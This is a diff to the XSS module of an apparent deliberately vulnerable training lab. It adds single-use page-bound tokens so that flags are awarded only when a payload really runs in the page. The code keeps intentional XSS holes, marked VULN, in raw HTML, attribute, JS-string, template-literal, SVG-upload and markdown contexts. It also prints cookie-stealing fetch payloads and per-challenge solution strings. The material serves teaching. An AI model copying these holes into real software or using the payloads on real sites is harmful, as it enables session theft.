@@ -2,6 +2,7 @@
 // Three classic flavors: reflected, stored, DOM-based. Each one exfiltrates the
 // (deliberately non-httpOnly) session cookie to /xss/collect to capture its flag.
 const express = require('express');
+const crypto = require('crypto');
 const { getDb } = require('../../lib/db');
 const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
 const { award, captured } = require('../../lib/flags');
@@ -26,7 +27,37 @@ const PAGE_FOR = {
 };
 
 // The canonical exfiltration payload, taught in the briefing and collect page.
-const EXFIL_PAYLOAD = "<script>fetch('/xss/collect?c='+document.cookie+'&v=reflected')</script>";
+// It echoes back window.__px, the page-bound nonce the server rendered into the
+// challenge page: only a payload that really executes in the page can know it.
+const EXFIL_PAYLOAD = "<script>fetch('/xss/collect?c='+document.cookie+'&v=reflected&n='+window.__px)</script>";
+
+// ---------------------------------------------------------------------------
+// Verification model: every beacon must present a per-session, per-vuln nonce
+// issued when the challenge page loads. The nonce is rendered into the page as
+// window.__px, so the beacon proves the payload executed in the page (or at
+// least that the challenge page was loaded in this session). Nonces are
+// single-use: a successful beacon consumes the nonce. A bare curl of
+// /xss/collect with no page load earns no flag.
+// ---------------------------------------------------------------------------
+function xssNonce(req, v) {
+  if (!req.session.xssNonce) req.session.xssNonce = {};
+  // hasOwnProperty: never trust a plain truthiness check on a keyed map.
+  if (!Object.prototype.hasOwnProperty.call(req.session.xssNonce, v)) {
+    req.session.xssNonce[v] = crypto.randomBytes(16).toString('hex');
+  }
+  return req.session.xssNonce[v];
+}
+// Rendered into each challenge page so an executing payload can read it.
+function xssNonceTag(req, v) {
+  return `<script>window.__px=${JSON.stringify(xssNonce(req, v))};</script>`;
+}
+function xssConsumeNonce(req, v, n) {
+  const m = req.session.xssNonce;
+  const cur = m && Object.prototype.hasOwnProperty.call(m, v) ? m[v] : null;
+  const ok = !!cur && cur === n && n.length > 0;
+  if (ok) delete m[v]; // single-use
+  return ok;
+}
 
 const BRIEF_HTML = `
 <p><b>What is XSS?</b> The app takes attacker-controlled input and renders it in the
@@ -67,8 +98,11 @@ router.get('/', (req, res) => {
     ${rows}
     ${collector}
     <h2>Cookie thief endpoint</h2>
-    <p>Payloads phone home to <code>/xss/collect?c=&lt;data&gt;&amp;v=&lt;vuln-id&gt;</code>.
-    It awards the flag only when the beacon actually arrives with data.</p>
+    <p>Payloads phone home to
+    <code>/xss/collect?c=&lt;data&gt;&amp;v=&lt;vuln-id&gt;&amp;n=&lt;page-token&gt;</code>.
+    Each challenge page renders a one-time token as <code>window.__px</code>; the
+    beacon must echo it back. The flag is awarded only when the beacon arrives
+    with data and a valid token, so a forged beacon with no page load earns nothing.</p>
   `));
 });
 
@@ -81,6 +115,7 @@ router.get('/search', (req, res) => {
     : `<p>Type something in the search box. The query is echoed back into this page.</p>`;
   res.send(page('Search (Reflected XSS)', `
     <h2>Product search</h2>
+    ${xssNonceTag(req, 'reflected')}
     <form method="GET" action="/xss/search">
       <input type="text" name="q" value="${esc(q)}" placeholder="search products..." size="40" />
       <button type="submit">Search</button>
@@ -103,6 +138,7 @@ router.get('/guestbook', (req, res) => {
   // VULN: stored comment bodies are rendered raw, no output encoding.
   res.send(page('Guestbook (Stored XSS)', `
     <h2>Guestbook</h2>
+    ${xssNonceTag(req, 'stored')}
     <p>Leave a comment. Everyone who views this page runs whatever you stored.</p>
     <form method="POST" action="/xss/guestbook">
       <input type="text" name="author" placeholder="your name" required /><br /><br />
@@ -134,6 +170,7 @@ router.get('/dom', (req, res) => {
   const demoUrl = '/xss/dom#' + demoPayload;
   res.send(page('DOM XSS playground', `
     <h2>Welcome message (DOM-based)</h2>
+    ${xssNonceTag(req, 'dom')}
     <p>This page takes whatever is after the <code>#</code> in the URL and drops
     it into the page with JavaScript. Nothing is ever sent to the server.</p>
     <div id="out" style="border:1px dashed #888; padding:1em; min-height:2em;"></div>
@@ -146,7 +183,9 @@ router.get('/dom', (req, res) => {
     (it opens this same page with <code>${esc(demoPayload)}</code> in the fragment).</p>
     <p class="note">For the flag, use the exfiltration payload with
       <code>v=dom</code>, URL-encoded into the fragment, e.g.
-      <code>/xss/dom#&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=dom')&lt;/script&gt;</code>.</p>
+      <code>/xss/dom#&lt;img src=x onerror="fetch('/xss/collect?c='+document.cookie+'&amp;v=dom&amp;n='+window.__px)"&gt;</code>.
+      The payload reads <code>window.__px</code>, the page-bound token: only code
+      running in this page can know it.</p>
   `));
 });
 
@@ -163,6 +202,7 @@ router.get('/profile', (req, res) => {
   // VULN: the stored bio is rendered raw with no output encoding.
   res.send(page('Profile (Stored XSS)', `
     <h2>User profile</h2>
+    ${xssNonceTag(req, 'stored-xss-profile')}
     <p>Your bio is stored and shown to everyone who visits this page.</p>
     <div class="comment"><b>you</b><p>${bio}</p></div>
     <hr />
@@ -192,6 +232,7 @@ router.get('/attr', (req, res) => {
   // VULN: user input reflected raw inside an HTML attribute value.
   res.send(page('Attribute breakout', `
     <h2>Nickname preview</h2>
+    ${xssNonceTag(req, 'xss-attr-breakout')}
     <form method="GET" action="/xss/attr">
       <input type="text" name="n" value="${esc(n)}" placeholder="nickname" size="40" />
       <button type="submit">Preview</button>
@@ -212,6 +253,7 @@ router.get('/jsctx', (req, res) => {
   // VULN: user input reflected raw inside a single-quoted JavaScript string.
   res.send(page('JS string context', `
     <h2>Greeting generator</h2>
+    ${xssNonceTag(req, 'xss-js-context')}
     <form method="GET" action="/xss/jsctx">
       <input type="text" name="q" value="${esc(q)}" placeholder="your name" size="40" />
       <button type="submit">Greet</button>
@@ -237,10 +279,15 @@ try { fs.mkdirSync(UPLOAD_DIR, { recursive: true }); } catch (e) { /* already ex
 router.get('/svg', (req, res) => {
   let files = [];
   try { files = fs.readdirSync(UPLOAD_DIR).filter((f) => f.endsWith('.svg')); } catch (e) { /* none */ }
-  const list = files.map((f) => `<li><a href="/xss/uploads/${esc(f)}">${esc(f)}</a></li>`).join('')
+  // The uploaded SVG opens as its own document, so it cannot see window.__px.
+  // The file links carry the page-bound nonce in the query string instead, and
+  // the payload reads it from location.search when it executes.
+  const svgNonce = xssNonce(req, 'xss-svg-upload');
+  const list = files.map((f) => `<li><a href="/xss/uploads/${esc(f)}?n=${svgNonce}">${esc(f)}</a></li>`).join('')
     || '<li><i>no uploads yet</i></li>';
   res.send(page('SVG upload', `
     <h2>Avatar SVG upload</h2>
+    ${xssNonceTag(req, 'xss-svg-upload')}
     <p>Paste SVG markup. It is saved and served back as <code>image/svg+xml</code>.
     Opening the file URL directly executes any script inside it.</p>
     <form method="POST" action="/xss/svg">
@@ -250,8 +297,9 @@ router.get('/svg', (req, res) => {
     </form>
     <hr /><h3>Uploaded files</h3><ul>${list}</ul>
     <p class="note">Upload idea: an <code>&lt;svg&gt;</code> containing
-    <code>&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-svg-upload')&lt;/script&gt;</code>,
-    then open its link directly.</p>
+    <code>&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-svg-upload&amp;n='+new URLSearchParams(location.search).get('n'))&lt;/script&gt;</code>,
+    then open its link directly. The file link carries the page-bound token in
+    <code>?n=</code>; only the script running inside the opened SVG can read it.</p>
   `));
 });
 
@@ -264,7 +312,7 @@ router.post('/svg', (req, res) => {
   const file = `${name}-${Date.now()}.svg`;
   // VULN: attacker-controlled SVG is stored and served as image/svg+xml, so embedded scripts run on direct visit.
   fs.writeFileSync(path.join(UPLOAD_DIR, file), raw);
-  res.redirect('/xss/uploads/' + file);
+  res.redirect('/xss/uploads/' + file + '?n=' + xssNonce(req, 'xss-svg-upload'));
 });
 
 router.get('/uploads/:file', (req, res) => {
@@ -294,7 +342,10 @@ router.get('/markdown', (req, res) => {
       <textarea name="md" rows="6" cols="60" placeholder="[click me](https://example.com)" required></textarea><br /><br />
       <button type="submit">Render</button>
     </form>
-    <p class="note">The renderer trusts link destinations completely. What URL schemes can a link use?</p>
+    <p class="note">The renderer trusts link destinations completely. What URL schemes can a link use?
+    For the flag, the <code>javascript:</code> URL must beacon with the page-bound token, e.g.
+    <code>[x](javascript:fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-markdown&amp;n='+window.__px))</code>
+    - then click the rendered link.</p>
   `));
 });
 
@@ -304,6 +355,7 @@ router.post('/markdown', (req, res) => {
   const html = naiveMarkdown(md);
   res.send(page('Markdown renderer', `
     <h2>Rendered output</h2>
+    ${xssNonceTag(req, 'xss-markdown')}
     <div class="comment">${html}</div>
     <hr />
     <p>Source:</p>
@@ -389,6 +441,7 @@ router.get('/clobber-admin', (req, res) => {
 router.get('/hashwrite', (req, res) => {
   res.send(page('Hash writer', `
     <h2>Shareable message</h2>
+    ${xssNonceTag(req, 'xss-hash-write')}
     <p>This page writes whatever is after the <code>#</code> straight into the document.</p>
     <div id="msg"></div>
     <script>
@@ -396,8 +449,9 @@ router.get('/hashwrite', (req, res) => {
       document.write(location.hash.slice(1));
     </script>
     <hr />
-    <p><b>Try it:</b> open <code>/xss/hashwrite#&lt;script&gt;...&lt;/script&gt;</code>
-    (URL-encoded). Use the exfiltration payload with <code>v=xss-hash-write</code>.</p>
+    <p><b>Try it:</b> open <code>/xss/hashwrite#&lt;img src=x onerror="..."&gt;</code>
+    (URL-encoded). Use the exfiltration payload with <code>v=xss-hash-write</code>
+    and <code>&amp;n='+window.__px</code> so the beacon carries the page-bound token.</p>
   `));
 });
 
@@ -407,6 +461,7 @@ router.get('/backtick', (req, res) => {
   // VULN: user input reflected raw inside a JavaScript template literal.
   res.send(page('Template literal', `
     <h2>Status message</h2>
+    ${xssNonceTag(req, 'xss-backtick')}
     <form method="GET" action="/xss/backtick">
       <input type="text" name="m" value="${esc(m)}" placeholder="status" size="40" />
       <button type="submit">Set status</button>
@@ -426,13 +481,18 @@ router.get('/backtick', (req, res) => {
 router.get('/collect', (req, res) => {
   const c = (req.query.c || '').toString();
   const v = (req.query.v || '').toString();
-  // Only award when a real beacon arrives: non-empty stolen data and a known vuln id.
-  if (c.length > 0 && VULN_IDS.includes(v)) {
+  const n = (req.query.n || '').toString();
+  // Award only when a real beacon arrives: non-empty stolen data, a known vuln
+  // id, AND the page-bound nonce for that vuln. The nonce is issued when the
+  // challenge page loads and rendered into the page as window.__px, so the
+  // beacon proves the payload executed in the page (or at least that the
+  // challenge page was loaded in this session). Nonces are single-use.
+  if (c.length > 0 && VULN_IDS.includes(v) && xssConsumeNonce(req, v, n)) {
     const flag = award(req, 'xss', v);
     return res.send(page('Cookie collector', `
       <h2>Beacon received</h2>
       <p>Captured <b>${c.length}</b> characters of data for vuln
-      <b>${esc(v)}</b>. Flag awarded:</p>
+      <b>${esc(v)}</b>, with a valid page-bound token. Flag awarded:</p>
       ${flagBox(flag)}
       <p><a href="/xss">Back to the XSS module</a></p>
     `));
@@ -440,10 +500,10 @@ router.get('/collect', (req, res) => {
   res.status(400).send(page('Cookie collector', `
     <h2>No flag</h2>
     <p>This endpoint only awards a flag when a real exfiltration beacon arrives
-    with non-empty data (<code>c</code>) and a valid vuln id
-    (<code>v</code> = reflected, stored, dom, stored-xss-profile, xss-attr-breakout,
-    xss-js-context, xss-svg-upload, xss-markdown, xss-dom-clobber, xss-hash-write,
-    or xss-backtick).</p>
+    with non-empty data (<code>c</code>), a valid vuln id (<code>v</code>), and
+    the page-bound token (<code>n</code> = <code>window.__px</code> rendered into
+    the challenge page). Loading the challenge page issues the token; a bare curl
+    of this endpoint earns nothing.</p>
     <p>The intended payload:</p>
     <pre><code>${esc(EXFIL_PAYLOAD)}</code></pre>
   `));
@@ -496,7 +556,7 @@ module.exports = {
       name: 'XSS in a JavaScript String',
       difficulty: 'Medium',
       hint: "Your input lands inside a single-quoted JS string: var q = '...'. Break out of the string, run your code, and comment out the tail.",
-      how: "Submit ';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context');// to break out of the string.",
+      how: "Submit ';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context&n='+window.__px);// to break out of the string.",
     },
     {
       id: 'xss-svg-upload',
@@ -531,7 +591,7 @@ module.exports = {
       name: 'XSS in a Template Literal',
       difficulty: 'Medium',
       hint: 'Your input lands inside backticks: var msg = `...`. Template literals evaluate ${...} expressions inline.',
-      how: 'Submit ${fetch(\'/xss/collect?c=\'+document.cookie+\'&v=xss-backtick\')} to execute code inside the literal.',
+      how: 'Submit ${fetch(\'/xss/collect?c=\'+document.cookie+\'&v=xss-backtick&n=\'+window.__px)} to execute code inside the literal.',
     },
   ],
   router,
